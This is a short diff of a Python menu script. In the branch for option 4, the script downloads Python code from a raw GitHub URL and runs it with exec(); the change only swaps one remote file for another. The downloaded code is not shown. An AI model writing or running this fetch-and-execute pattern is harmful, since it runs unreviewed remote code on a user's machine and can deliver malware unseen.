@@ -19,6 +19,6 @@ while True:
     if gg == '4':
         os.system('cls')
         print("                                               \033[1;39mLaunching...")
-        exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/psdwas/main/main.py').text)
+        exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/vjp231/main/PyClickerTrigger').text)
     else:
         continue
